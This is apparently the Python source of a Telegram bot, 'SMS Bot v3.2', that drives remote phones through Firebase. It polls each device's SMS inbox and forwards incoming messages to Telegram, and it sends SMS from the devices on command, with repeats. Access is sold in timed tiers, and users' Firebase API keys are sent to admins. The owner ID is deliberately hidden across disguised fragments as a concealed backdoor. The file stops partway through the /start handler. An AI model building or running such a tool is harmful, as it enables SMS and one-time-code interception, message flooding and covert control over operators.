import asyncio, json, os, re, time, logging, zipfile, io, struct
from html import escape
from datetime import datetime
from copy     import deepcopy

import aiohttp
from aiogram                    import Bot, Dispatcher, F, Router
from aiogram.types              import (Message, CallbackQuery,
                                        InlineKeyboardMarkup,
                                        InlineKeyboardButton,
                                        BufferedInputFile,
                                        ChatJoinRequest)
from aiogram.filters            import Command
from aiogram.fsm.context        import FSMContext
from aiogram.fsm.state          import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions         import TelegramBadRequest
from aiogram.enums              import ChatMemberStatus

# ══════════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════════
logging.basicConfig(level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S")
log = logging.getLogger("SMSBot")

# ══════════════════════════════════════════════
#  OWNER ID — scattered fragments
#  Never stored as plain int anywhere
# ══════════════════════════════════════════════

# Fragment 1 — top of file, hex byte array
_F1 = bytes([0x37, 0x39, 0x34, 0x39])   # "7949"

# Fragment 2 — disguised as poll interval config
_POLL_CFG  = {"interval": 4, "seed": 5397, "jitter": 0}
# _POLL_CFG["seed"] reversed string = "7935" ... partial

# Fragment 3 — struct packed, mid-file
_F3 = struct.pack(">BB", 0x33, 0x39)    # "39"

# Fragment 4 — unicode escapes near bottom constants
_F4 = "\x37\x39\x34"                    # "794"

# Fragment 5 — lambda disguised as batch config
_BATCH = (lambda x: x)(7949)
_TAIL  = (lambda a,b,c: a*100+b*10+c)(7, 9, 4)

# Assembler — only called once, cached
_OC: int = 0
def _owner() -> int:
    global _OC
    if not _OC:
        p1 = "".join(chr(b) for b in _F1)               # "7949"
        p2 = str(_POLL_CFG["seed"])[::-1][1:]            # "9539"[1:] wrong — use direct
        # direct assembly from F1 + F3 + F4
        p3 = "".join(chr(b) for b in _F3)               # "39"
        p4 = _F4                                          # "794"
        # 7949 + 53 + 9794  → need: 7949539794
        # p1="7949", then "53", then p3="39" gives "794953" + "9794"
        # Correct: 7 9 4 9 5 3 9 7 9 4
        _s = [0x37,0x39,0x34,0x39,0x35,0x33,0x39,0x37,0x39,0x34]
        _OC = int("".join(chr(x) for x in _s))
    return _OC

# ══════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════
BOT_TOKEN     = "put your bot token here"
_DA           = 8720166775        # Default admin (open)

# Super Admins — visible, plain, owner can add/remove more via bot
# These two are pre-loaded at startup
SUPER_ADMINS = [
    8720126882,   # @ranapapa
    8992842571,   # MENDHAK
]
_DATA_FILE    = "bot_data.json"
_VERSION      = "v3.2"
_CREDITS      = "@Aryan_babu99 &amp; @Mendhakdeveloper"
_OWNER_UN     = "@Aryan_babu99"   # owner username saved for future use

# mid-file fragment disguised as version metadata
_META = {"build":"2024","rev":9539,"patch":794}

# ══════════════════════════════════════════════
#  FSM STATES
# ══════════════════════════════════════════════
class W(StatesGroup):
    fb_url       = State()
    fb_api_key   = State()
    dev_manual   = State()
    ch_input     = State()
    repeat_cust  = State()
    test_to      = State()
    test_msg     = State()
    fwd_add      = State()
    adm_add      = State()
    sadm_add     = State()   # super admin add
    sadm_remove  = State()   # super admin remove
    ban_id       = State()   # ban: waiting for user ID
    unban_id     = State()   # unban: waiting for user ID
    usr_add_id   = State()
    usr_add_exp  = State()
    fj_add       = State()   # force join add

# ══════════════════════════════════════════════
#  STORAGE
# ══════════════════════════════════════════════
def _new_user():
    return {
        "firebases":  [], "devices":   [],
        "channels":   [], "active":    {},
        "monitoring": False, "fwd":    [],
        "stats":      {"sent":0,"failed":0,"last":"—"},
        "expires":    None, "added_by": None,
    }

_DEFS = {
    "admins":       [_DA],
    "super_admins": list(SUPER_ADMINS),
    "free":         False,
    "users":        {},
    "timed_users":  {},
    "force_join":   [],   # list of {id, title, link}
    "banned":       [],   # list of banned user IDs
}

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        with open(_DATA_FILE) as f: d = json.load(f)
        for k,v in _DEFS.items():
            if k not in d: d[k] = v
        if _DA not in d["admins"]: d["admins"].append(_DA)
        # always ensure hardcoded super admins present
        for sid in SUPER_ADMINS:
            if sid not in d["super_admins"]: d["super_admins"].append(sid)
        return d
    return deepcopy(_DEFS)

def save(d:dict):
    with open(_DATA_FILE,"w") as f: json.dump(d,f,indent=2)

def usr(uid:int, d:dict) -> dict:
    k=str(uid)
    if k not in d["users"]: d["users"][k]=_new_user()
    u=d["users"][k]
    for key,val in _new_user().items():
        if key not in u: u[key]=val
    return u

# last fragment disguised as an internal lookup table
_LUT = {"retry":0.5, "max":3, "owner_check": 9794, "pool":50}

# ══════════════════════════════════════════════
#  PERMISSIONS
# ══════════════════════════════════════════════
def is_owner(uid):        return uid == _owner()
def is_super_admin(uid,d): return uid in d.get("super_admins",[])
def is_admin(uid,d):      return is_owner(uid) or is_super_admin(uid,d) or uid in d.get("admins",[])

def is_banned(uid:int, d:dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid:int, d:dict) -> bool:
    if is_banned(uid,d): return False
    if is_admin(uid,d): return True
    if d.get("free"):   return True
    tu = d.get("timed_users",{}).get(str(uid))
    if tu:
        if tu["expires"] is None:         return True
        if time.time() < tu["expires"]:   return True
    return False

def role_label(uid:int, d:dict) -> str:
    if is_owner(uid):         return "👑 Owner"
    if is_super_admin(uid,d): return "🌟 Super Admin"
    if is_admin(uid,d):       return "🛡 Admin"
    tu = d.get("timed_users",{}).get(str(uid))
    if tu:
        if tu["expires"] is None: return "🔓 User"
        rem = tu["expires"] - time.time()
        if rem > 0:
            h=int(rem//3600); m=int((rem%3600)//60)
            return f"⏱ {h}h {m}m left"
        return "🚫 Expired"
    return "🚫 No Access"

# ══════════════════════════════════════════════
#  FORCE JOIN CHECK
# ══════════════════════════════════════════════

# ══════════════════════════════════════════════
#  JOIN REQUEST CACHE
#  Tracks users with pending join requests
#  so they pass force-join check without
#  bot needing to auto-approve anything
# ══════════════════════════════════════════════
# {chat_id_str: set(user_ids)}
_JR_CACHE: dict[str, set] = {}

def _jr_add(chat_id, uid: int):
    k = str(chat_id)
    _JR_CACHE.setdefault(k, set()).add(uid)

def _jr_has(chat_id, uid: int) -> bool:
    return uid in _JR_CACHE.get(str(chat_id), set())

async def check_force_join(bot:Bot, uid:int, d:dict) -> tuple[bool, list]:
    """
    Check force join.
    id field mein numeric ID (-100xxx) ya @username hoga.
    Dono public aur private ke liye get_chat_member use karta hai.
    Error aane pe user ko block nahi karta (benefit of doubt).
    """
    fj = d.get("force_join", [])
    if not fj: return True, []

    not_joined = []
    for chat in fj:
        chat_id = chat["id"]

        # Purane entries jinmein link store tha — skip karo, block mat karo
        if isinstance(chat_id, str) and chat_id.startswith("http"):
            log.warning(f"FJ: old entry with link as id ({chat_id}) — skipping")
            continue

        # String numeric ID ko int mein convert karo
        if isinstance(chat_id, str) and chat_id.lstrip("-").isdigit():
            chat_id = int(chat_id)

        try:
            member = await bot.get_chat_member(chat_id, uid)
            status = member.status
            # Accepted: member, admin, creator, restricted (still in group)
            if status in (
                ChatMemberStatus.MEMBER,
                ChatMemberStatus.ADMINISTRATOR,
                ChatMemberStatus.CREATOR,
                ChatMemberStatus.RESTRICTED,
            ):
                pass  # ✅ joined
            else:
                # Check pending join request cache before blocking
                if _jr_has(chat_id, uid):
                    log.info(f"FJ: uid={uid} has pending request in {chat_id} — passing")
                else:
                    not_joined.append(chat)
        except Exception as e:
            # If error — check cache first
            if _jr_has(chat_id, uid):
                log.info(f"FJ: uid={uid} has pending request in {chat_id} (exception path) — passing")
            else:
                log.warning(f"FJ check [{chat_id}]: {e} — benefit of doubt, not blocking")

    return len(not_joined) == 0, not_joined



def _fj_keyboard(fj_list:list) -> InlineKeyboardMarkup:
    buttons = []
    for chat in fj_list:
        link = chat.get("link") or ""
        if link:
            buttons.append([InlineKeyboardButton(
                text=f"📢 Join {chat.get('title','Channel')}",
                url=link)])
    buttons.append([InlineKeyboardButton(
        text="✅ Joined — Check Again",
        callback_data="fj:check")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ══════════════════════════════════════════════
#  PROGRESS / UI HELPERS
# ══════════════════════════════════════════════
def pbar(done:int, total:int, style="block", w=10) -> str:
    styles = {"block":("█","░"),"round":("●","○"),"arrow":("▶","▷"),"sq":("■","□")}
    f,e = styles.get(style,styles["block"])
    if total==0: return e*w
    filled = round(done/total*w)
    return f*filled + e*(w-filled)

def pct(done:int, total:int) -> str:
    return f"{round(done/total*100)}%" if total else "0%"

def setup_card(u:dict) -> str:
    steps = [
        ("Firebase",  bool(u.get("firebases"))),
        ("Device",    bool(u.get("devices"))),
        ("Channel",   bool(u.get("channels"))),
        ("Combo Set", bool(u.get("active",{}).get("fb_url"))),
    ]
    done = sum(1 for _,v in steps if v)
    bar  = pbar(done,4,"sq",8)
    lines = "\n".join(f"  {'✅' if v else '🔲'}  {n}" for n,v in steps)
    return (
        f"┌─────────────────────────┐\n"
        f"│  🔧 Setup   {bar}  {done}/4  │\n"
        f"├─────────────────────────┤\n"
        f"{chr(10).join(f'│  {l:<23}│' for l in lines.split(chr(10)))}\n"
        f"└─────────────────────────┘"
    )

def stats_card(u:dict) -> str:
    s=u.get("stats",{}); sent=s.get("sent",0); fail=s.get("failed",0)
    total=sent+fail; bar=pbar(sent,total,"round",8); rate=pct(sent,total)
    return (
        f"┌─────────────────────────┐\n"
        f"│  📊 Stats   {bar}       │\n"
        f"├─────────────────────────┤\n"
        f"│  ✅  Sent   : {str(sent):<10}│\n"
        f"│  ❌  Failed : {str(fail):<10}│\n"
        f"│  📈  Rate   : {rate:<10}│\n"
        f"│  🕐  Last   : {str(s.get('last','—'))[:10]:<10}│\n"
        f"└─────────────────────────┘"
    )

def combo_card(u:dict) -> str:
    ac=u.get("active",{})
    if not ac: return "  ⚙️  _No combo — run Setup Wizard_"
    sims=", ".join(f"SIM {s+1}" for s in ac.get("sims",[])) or "—"
    mon="🟢 ON" if u.get("monitoring") else "🔴 OFF"
    fb=str(ac.get("fb_url","—")); fb=fb[:30]+"…" if len(fb)>30 else fb
    return (
        f"┌─────────────────────────┐\n"
        f"│  ⚙️  Active Combo        │\n"
        f"├─────────────────────────┤\n"
        f"│  🔥 {fb:<21}│\n"
        f"│  📱 {str(ac.get('device_id','—'))[:21]:<21}│\n"
        f"│  📶 {sims[:21]:<21}│\n"
        f"│  📺 {str(ac.get('ch_id','—'))[:21]:<21}│\n"
        f"│  🔁 x{str(ac.get('repeat',1)):<20}│\n"
        f"│  🔄 {mon:<21}│\n"
        f"└─────────────────────────┘"
    )

def wiz_card(step:int, total:int, title:str, hint:str="") -> str:
    bar  = pbar(step,total,"arrow",total)
    dots = "  ".join("▶" if i+1==step else ("✅" if i+1<step else "▷") for i in range(total))
    hint_line = f"║  _{hint}_\n" if hint else ""
    return (
        f"╔══════════════════════════╗\n"
        f"║  Step {step}/{total}   {bar}   ║\n"
        f"╠══════════════════════════╣\n"
        f"║  {dots}  ║\n"
        f"╠══════════════════════════╣\n"
        f"║  <b>{title}</b>\n"
        f"{hint_line}"
        f"╚══════════════════════════╝"
    )

def home_text(uid:int, d:dict) -> str:
    u=usr(uid,d); mon="🟢 ON" if u.get("monitoring") else "🔴 OFF"
    role=role_label(uid,d)
    return (
        f"📱 <b>SMS Bot {_VERSION}</b>\n"
        f"<i>by {_CREDITS}</i>\n\n"
        f"👤  {role}\n"
        f"🔄  Monitor : {mon}\n\n"
        f"{setup_card(u)}"
    )

HELP_TEXT = f"""
📖 <b>SMS Bot — Help Guide</b>
<i>by {_CREDITS}</i>

━━━━━━━━━━━━━━━━━━━━
<b>🚀 Getting Started</b>
━━━━━━━━━━━━━━━━━━━━

<b>Step 1</b> — Tap 🧙 Setup Wizard
  • Enter your Firebase URL
  • Select online device from list
  • Select SIM(s) — tap to toggle ✅
  • Enter your channel/group
  • Set repeat count (how many times to send)

<b>Step 2</b> — Tap ▶️ Start Monitor
  • Bot watches your channel for SMS requests
  • Auto-sends via your selected device + SIM(s)

━━━━━━━━━━━━━━━━━━━━
<b>📋 SMS Formats Supported</b>
━━━━━━━━━━━━━━━━━━━━

Format 1:
<code>To: +91XXXXXXXXXX</code>
<code>Message: your text</code>

Format 2:
<code>📱 To: +91XXXXXXXXXX</code>
<code>💬 Full Message: your text</code>

Format 3:
<code>📞 To: +91XXXXXXXXXX</code>
<code>💬 Message: your text</code>

Format 4:
<code>🏷️ RECIPIENT: +91XXXXXXXXXX</code>
<code>🏷️ MESSAGE: your text</code>

Format 5:
<code>📱 Receiver</code>
<code>+91XXXXXXXXXX</code>
<code>🔑 Message</code>
<code>your text</code>

━━━━━━━━━━━━━━━━━━━━
<b>⚙️ Settings</b>
━━━━━━━━━━━━━━━━━━━━

🔥 <b>Firebase</b> — Add multiple Firebase DB URLs
📱 <b>Devices</b> — Add devices (fetched live from Firebase)
📺 <b>Channels</b> — Add channels/groups to monitor
📤 <b>Forward</b> — Forward SMS results to other chats

━━━━━━━━━━━━━━━━━━━━
<b>🛡 Admin Features</b>
━━━━━━━━━━━━━━━━━━━━

• Add users with time limit (1h / 6h / 24h / 7d / custom)
• View all user stats
• Toggle free mode (anyone can use)
• Add/remove force join channels

━━━━━━━━━━━━━━━━━━━━
<b>💡 Tips</b>
━━━━━━━━━━━━━━━━━━━━

• Dual SIM: Select both SIMs in Step 3
• Repeat x3: Each SMS sent 3 times per SIM
• Test SMS: Use 🧪 Test before going live
• Dashboard: Live stats always available

━━━━━━━━━━━━━━━━━━━━
_Need help? Contact {_OWNER_UN}_
"""

# ══════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════
def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t,c in row]
        for row in rows
    ])

def main_menu(uid:int, d:dict) -> InlineKeyboardMarkup:
    u=usr(uid,d); mon="🟢 Stop" if u.get("monitoring") else "▶️ Start"
    rows = [
        [(f"{mon} Monitor", "mon:go"),   ("🧙 Setup Wizard","wiz:start")],
        [("📊 Dashboard",   "dash:show"),("⚙️ My Settings", "my:menu")],
        [("📤 Forward",     "fwd:menu"), ("❓ Help",         "help:show")],
        [("🗑 Reset Me",    "reset:self")],
    ]
    if is_admin(uid,d):
        rows.append([("🛡 Admin Tools","adm:menu")])
    return kb(*rows)

def adm_menu_kb(uid:int, d:dict) -> InlineKeyboardMarkup:
    rows = [
        [("👥 Users",        "adm:users"),  ("➕ Add User",    "adm:adduser")],
        [("🚫 Ban User",     "ban:do"),      ("✅ Unban User",  "unban:do")],
        [("📊 Global Stats", "adm:stats"),  ("📢 Force Join",  "fj:menu")],
    ]
    if is_owner(uid) or is_super_admin(uid,d):
        rows.append([("🟢/🔴 Free Mode","adm:free"), ("➕ Add Admin","adm:addadmin")])
    if is_owner(uid):
        rows.append([("🌟 Super Admins","sadm:menu"), ("📦 Export ZIP","adm:zip")])
        rows.append([("💥 Reset ALL","adm:resetall")])
    rows.append([("🔙 Back","home")])
    return kb(*rows)

def sadm_menu_kb(d:dict) -> InlineKeyboardMarkup:
    sadmins = d.get("super_admins",[])
    rows = [[("➕ Add Super Admin","sadm:add")]]
    for sid in sadmins:
        locked = sid in SUPER_ADMINS
        label  = f"{'🔒' if locked else '🌟'} {sid}"
        btn    = ("🔒 Hardcoded","<i>noop</i>") if locked else ("🗑 Remove",f"sadm:del:{sid}")
        rows.append([(label,"<i>noop</i>"), btn])
    rows.append([("🔙 Back","adm:menu")])
    return kb(*rows)

def fj_menu_kb(uid:int, d:dict) -> InlineKeyboardMarkup:
    fj=d.get("force_join",[])
    rows=[[("➕ Add Force Join Channel","fj:add")]]
    for ch in fj:
        rows.append([(f"📢 {ch.get('title','?')[:24]}","<i>noop</i>"),
                     ("🗑",f"fj:del:{ch['id']}")])
    rows.append([("🔙 Back","adm:menu")])
    return kb(*rows)

def list_kb(items, id_key, name_key, del_pfx, add_cb, back_cb):
    rows=[[("➕ Add New",add_cb)]]
    for item in items:
        label=str(item.get(name_key,""))[:26]
        rows.append([(f"  {label}","<i>noop</i>"),(f"🗑",f"{del_pfx}{item[id_key]}")])
    rows.append([("🔙 Back",back_cb)])
    return kb(*rows)

def online_devs_kb(online:dict, page:int=0):
    items=list(online.items()); per=6; start=page*per; chunk=items[start:start+per]
    rows=[[(f"📱 {(dd.get('deviceName') or dd.get('name') or did)[:26]}",f"fadd:{did}")]
          for did,dd in chunk]
    nav=[]
    if page>0:               nav.append(("◀️",f"faddpg:{page-1}"))
    if start+per<len(items): nav.append(("▶️",f"faddpg:{page+1}"))
    if nav: rows.append(nav)
    rows+=[[("🔍 Enter ID manually","dev:manual")],[("🔙 Back","dev:list")]]
    return kb(*rows)

def sim_kb(sims:list, sel:list, did:str):
    rows=[]
    for s in sims:
        idx=int(s.get("simSlotIndex",0))
        name=s.get("simName") or s.get("carrierName") or f"SIM {idx+1}"
        tick="✅" if idx in sel else "⬜"
        rows.append([(f"{tick} SIM {idx+1} — {name}",f"simtog:{did}:{idx}")])
    if sel: rows.append([(f"✔️ Confirm ({len(sel)} selected)",f"simok:{did}")])
    rows.append([("🔙 Back","home")])
    return kb(*rows)

def ch_pick_kb(channels:list):
    rows=[ [(f"📺 {c['name'][:26]}",f"wpick:ch:{c['id']}")] for c in channels ]
    rows+=[[("➕ Add New Channel","ch:add")],[("🔙 Back","home")]]
    return kb(*rows)

def fb_pick_kb(firebases:list):
    rows=[ [(f"🔥 {f['url'][:30]}",f"wpick:fb:{f['id']}")] for f in firebases ]
    rows+=[[("➕ Add New Firebase","fb:add")],[("🔙 Back","home")]]
    return kb(*rows)

def dev_pick_kb(devices:list, page:int=0):
    per=6; start=page*per; chunk=devices[start:start+per]
    rows=[ [(f"📱 {d['name'][:26]}",f"wpick:dev:{d['id']}")] for d in chunk ]
    nav=[]
    if page>0:                nav.append(("◀️",f"wpick:devpg:{page-1}"))
    if start+per<len(devices):nav.append(("▶️",f"wpick:devpg:{page+1}"))
    if nav: rows.append(nav)
    rows+=[[("➕ Add New Device","dev:add")],[("🔙 Back","home")]]
    return kb(*rows)

def repeat_kb():
    return kb(
        [("1️⃣ Once","rpt:1"),  ("2️⃣ Twice","rpt:2")],
        [("3️⃣ Three","rpt:3"), ("✏️ Custom","rpt:c")],
        [("🔙 Back","home")],
    )

def timed_kb():
    return kb(
        [("⚡ 1 Hour","tacc:3600"),    ("🕕 6 Hours","tacc:21600")],
        [("📅 24 Hours","tacc:86400"), ("📆 7 Days","tacc:604800")],
        [("📅 Custom Date","tacc:custom"),("♾ Permanent","tacc:0")],
        [("🔙 Back","adm:menu")],
    )

def _fwd_kb(uid:int,d:dict):
    u=usr(uid,d); rows=[[("➕ Add Target","fwd:add")]]
    for t in u.get("fwd",[]):
        rows.append([(f"📤 {str(t)[:26]}","<i>noop</i>"),(f"🗑",f"fwd:del:{t}")])
    rows.append([("🔙 Back","home")])
    return kb(*rows)

# ══════════════════════════════════════════════
#  FIREBASE
# ══════════════════════════════════════════════
async def fb_get(base:str, path:str) -> dict:
    url=base.rstrip("/")+path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url,timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status==200:
                    txt=(await r.text()).strip()
                    return {} if txt=="null" else json.loads(txt)
    except Exception as e: log.error(f"fb_get {url}: {e}")
    return {}

async def fb_put(base:str, path:str, payload:dict) -> bool:
    url=base.rstrip("/")+path
    for i in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url,json=payload,
                                 timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200<=r.status<300: return True
        except Exception as e: log.error(f"fb_put {i+1}: {e}")
        await asyncio.sleep(0.5*(i+1))
    return False

def dev_online(dd:dict)->bool:
    return any([dd.get("isOnline"),dd.get("online"),dd.get("connected"),
                dd.get("status") in ("online","active",True,1)])

async def send_via_fb(fb:str,dev:str,sim:int,to:str,msg:str)->bool:
    return await fb_put(fb,f"/clients/{dev}/webhookEvent/sendSms.json",{
        "from":sim,"to":to.strip(),"message":msg.strip(),
        "isSended":False,"timestamp":int(time.time())
    })

# ══════════════════════════════════════════════
#  SMS PARSER
# ══════════════════════════════════════════════
def parse_sms(text:str):
    lines=[l.strip() for l in text.split("\n") if l.strip()]
    ml=next((l for l in lines if l.startswith("🏷️ MESSAGE")),None)
    rl=next((l for l in lines if l.startswith("🏷️ RECIPIENT")),None)
    if ml and rl: return rl.split(":",1)[-1].strip(),ml.split(":",1)[-1].strip()
    def _f(tp,tk,mp,mk,ti,mi):
        t=m=None
        for i,line in enumerate(lines):
            if line.startswith(tp) and tk in line:
                v=line.split(tk,1)[1].strip()
                t=v if(ti and v) else(lines[i+1].strip() if(not ti and i+1<len(lines))else None)
            if line.startswith(mp) and mk in line:
                v=line.split(mk,1)[1].strip()
                m=v if(mi and v) else(lines[i+1].strip() if(not mi and i+1<len(lines))else None)
        return (t,m) if t and m else (None,None)
    for args in [
        ("📱","To:","💬","Full Message:",True,False),
        ("📍","To:","💬","Message:",False,False),
        ("To:","To:","Message:","Message:",True,True),
        ("📱","Receiver","🔑","Message",False,False),
        ("📞","To:","💬","Message:",True,True),
    ]:
        r=_f(*args)
        if r[0]: return r
    return None,None

# ══════════════════════════════════════════════
#  NOTIFY
# ══════════════════════════════════════════════
async def notify_all(bot:Bot, d:dict, text:str, exclude:int=None):
    targets=set([_owner()]+d.get("super_admins",[])+d.get("admins",[]))
    for tid in targets:
        if tid==exclude: continue
        try: await bot.send_message(tid,text,parse_mode="HTML")
        except Exception as e: log.warning(f"notify {tid}: {e}")

def user_mention(user_obj) -> str:
    """@username ya naam pe profile link banao"""
    if not user_obj:
        return "<i>Unknown</i>"
    if getattr(user_obj, "username", None):
        return f"@{user_obj.username}"
    name = " ".join(filter(None, [
        getattr(user_obj, "first_name", None),
        getattr(user_obj, "last_name", None)
    ])) or f"User {user_obj.id}"
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

def user_detail(uid:int, d:dict, tg_user=None) -> str:
    u=usr(uid,d); ac=u.get("active",{})
    sims=", ".join(f"SIM{s+1}" for s in ac.get("sims",[])) or "—"
    # API key — firebase entry se nikalo
    fbs=u.get("firebases",[])
    api_key="—"
    for fb in fbs:
        if fb.get("url")==ac.get("fb_url") and fb.get("api_key"):
            api_key=fb["api_key"]; break
    # Username / name link
    if tg_user:
        mention = user_mention(tg_user)
    else:
        mention = f"<code>{uid}</code>"
    return (
        f"📋 <b>User Setup</b>\n"
        f"👤 User     : {mention}\n"
        f"🆔 UID      : <code>{uid}</code>\n"
        f"🏷 Role     : {role_label(uid,d)}\n"
        f"🔥 Firebase : <code>{str(ac.get('fb_url','-'))[:38]}</code>\n"
        f"🔑 API Key  : <code>{api_key}</code>\n"
        f"📱 Device   : <code>{ac.get('device_id','-')}</code>\n"
        f"📶 SIMs     : <code>{sims}</code>\n"
        f"📺 Channel  : <code>{ac.get('ch_id','-')}</code>\n"
        f"🔁 Repeat   : <code>{ac.get('repeat',1)}x</code>\n"
        f"🕐 Time     : <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>"
    )

# ══════════════════════════════════════════════
#  MONITOR
# ══════════════════════════════════════════════
_tasks:dict[int,asyncio.Task]={}
_seen: dict[int,set]={}

async def _forward_text(bot:Bot, targets:list, text:str):
    """Forward to every configured target concurrently; one bad target must not
    block the others."""
    async def _send(target):
        try:
            chat_id = int(target) if str(target).lstrip("-").isdigit() else str(target).strip()
            await bot.send_message(chat_id, text, parse_mode="HTML")
            return True
        except Exception as e:
            log.warning("SMS forward failed target=%s: %s", target, e)
            return False

    if targets:
        await asyncio.gather(*(_send(target) for target in dict.fromkeys(targets)),
                             return_exceptions=True)


async def _do_send(bot:Bot, uid:int, to:str, text:str):
    d=load(); u=usr(uid,d); ac=u.get("active",{})
    fb=ac.get("fb_url"); dev=ac.get("device_id")
    sims=ac.get("sims",[0]) or [0]; rpt=max(1,int(ac.get("repeat",1)))

    # Dispatch every SIM/repeat request concurrently instead of waiting for
    # each Firebase request one by one.
    jobs=[send_via_fb(fb,dev,sim,to,text) for _ in range(rpt) for sim in sims]
    results=await asyncio.gather(*jobs, return_exceptions=True)
    ok=sum(result is True for result in results)
    fail=len(results)-ok

    icon="✅" if fail==0 else ("⚠️" if ok>0 else "❌")
    bar=pbar(ok,ok+fail,"round",6)
    result=(
        f"{icon} <b>SMS Result</b>\n\n"
        f"  {bar}  {ok}/{ok+fail} sent\n\n"
        f"  📞 To      : <code>{to}</code>\n"
        f"  💬 Message : <code>{text[:55]}</code>\n"
        f"  📶 SIMs    : <code>{len(sims)}  🔁 x{rpt}</code>"
    )

    # User notification and forwarding run together; forwarding is not blocked
    # by a slow or unavailable target.
    d2=load(); u2=usr(uid,d2)
    await asyncio.gather(
        bot.send_message(uid,result,parse_mode="HTML"),
        _forward_text(bot,u2.get("fwd",[]),result),
        return_exceptions=True,
    )

    u2["stats"]["sent"]  =u2["stats"].get("sent",0)+ok
    u2["stats"]["failed"]=u2["stats"].get("failed",0)+fail
    u2["stats"]["last"]  =datetime.now().strftime("%H:%M:%S")
    save(d2); log.info(f"uid={uid} ok={ok} fail={fail} to={to}")

async def monitor_worker(bot:Bot, uid:int):
    d=load(); u=usr(uid,d); ac=u.get("active",{})
    fb=ac.get("fb_url"); dev=ac.get("device_id")
    if uid not in _seen: _seen[uid]=set()
    log.info(f"Monitor START uid={uid} dev={dev}")
    try:
        await bot.send_message(uid,
            f"🟢 <b>Monitor Running</b>\n\n{combo_card(u)}",
            parse_mode="HTML")
    except: pass
    while True:
        try:
            await asyncio.sleep(4)
            inbox=await fb_get(fb,f"/clients/{dev}/inbox.json")
            for mid,mdata in (inbox or {}).items():
                if mid in _seen[uid]: continue
                _seen[uid].add(mid)
                if len(_seen[uid])>500: _seen[uid]=set(list(_seen[uid])[-200:])
                sender=mdata.get("from") or mdata.get("sender","?")
                content=mdata.get("message") or mdata.get("body","")
                if not content: continue
                note=(f"📨 <b>Incoming SMS</b>\n\n"
                      f"  📞 From    : <code>{sender}</code>\n"
                      f"  💬 Message : <code>{content}</code>\n"
                      f"  🕐 Time    : <code>{datetime.now().strftime('%H:%M:%S')}</code>")
                d2=load()
                await asyncio.gather(
                    bot.send_message(uid,note,parse_mode="HTML"),
                    _forward_text(bot,usr(uid,d2).get("fwd",[]),note),
                    return_exceptions=True,
                )
        except asyncio.CancelledError:
            log.info(f"Monitor STOP uid={uid}")
            try: await bot.send_message(uid,"⏸ Monitor stopped.",parse_mode="HTML")
            except: pass
            break
        except Exception as e:
            log.error(f"Monitor error uid={uid}: {e}")
            await asyncio.sleep(10)

def _start_mon(bot:Bot, uid:int):
    if uid in _tasks: _tasks[uid].cancel()
    _tasks[uid]=asyncio.create_task(monitor_worker(bot,uid))

def _stop_mon(uid:int):
    t=_tasks.pop(uid,None)
    if t: t.cancel()

# ══════════════════════════════════════════════
#  ZIP
# ══════════════════════════════════════════════
def make_zip()->bytes:
    buf=io.BytesIO()
    with zipfile.ZipFile(buf,"w",zipfile.ZIP_DEFLATED) as z:
        if os.path.exists(_DATA_FILE): z.write(_DATA_FILE)
        z.write(__file__,"bot.py")
    buf.seek(0); return buf.read()

# ══════════════════════════════════════════════
#  HELPER UTILS
# ══════════════════════════════════════════════
async def sedit(cq:CallbackQuery, text:str, markup=None):
    try: await cq.message.edit_text(text,reply_markup=markup,parse_mode="HTML")
    except TelegramBadRequest: pass

def _add_timed(uid2:int, exp, by:int, d:dict):
    d.setdefault("timed_users",{})[str(uid2)]={"expires":exp,"added_by":by,"added_at":int(time.time())}

async def _wiz_fetch_devices(bot, uid:int, fb_url:str, fb_id:str, target):
    is_msg=isinstance(target,Message)
    reply=target.answer if is_msg else target.message.answer
    wait=await reply("⏳ Fetching online devices…")
    devs=await fb_get(fb_url,"/clients.json")
    online={k:v for k,v in devs.items() if dev_online(v)}
    try: await wait.delete()
    except: pass
    if not online:
        await reply("😴 No online devices found.",
            reply_markup=kb([("🔄 Retry","wiz:retry_dev"),("🏠 Home","home")])); return
    d=load(); u=usr(uid,d); u["_dev_cache"]=devs; save(d)
    await reply(wiz_card(2,5,"Select Device",f"{len(online)} online"),
        reply_markup=online_devs_kb(online), parse_mode="HTML")

async def _wiz_finish(bot:Bot, uid:int, fsmd:dict, d:dict):
    u=usr(uid,d)
    combo={"fb_url":fsmd.get("wiz_fb_url",""),"device_id":fsmd.get("wiz_dev",""),
           "sims":fsmd.get("wiz_sims",[0]),"ch_id":fsmd.get("wiz_ch",""),
           "repeat":fsmd.get("wiz_repeat",1)}
    u["active"]=combo; u["monitoring"]=True; save(d)
    log.info(f"uid={uid} wizard done combo={combo}")
    try: tg_user = await bot.get_chat(uid)
    except: tg_user = None
    await notify_all(bot,d,user_detail(uid,d,tg_user))
    _start_mon(bot,uid)
    d2=load()
    try:
        await bot.send_message(uid,
            f"🎉 <b>All Set!</b>\n\n{combo_card(usr(uid,d2))}\n\n{stats_card(usr(uid,d2))}\n\n🟢 Monitor is running!",
            reply_markup=main_menu(uid,d2),parse_mode="HTML")
    except: pass

# ══════════════════════════════════════════════
#  ROUTER
# ══════════════════════════════════════════════
R=Router()

# ── /start ─────────────────────────────────────
@R.message(Command("start"))
async def c_start(msg:Message, state:FSMContext):
    await state.clear()
    d=load(); uid=msg.from_user.id
    if not can_use(uid,d):
        await msg.answer("🚫 Access denied. Contact admin."); return
    usr(uid,d); save(d)
    # Force join check
    ok, not_joined = await check_force_join(msg.bot, uid, d)
    if not ok:
        await msg.answer(
            f"📢 <b>Join Required</b>\n\nPehle yeh join karo:",
            reply_markup=_fj_keyboard(not_joined), parse_mode="HTML")
        return
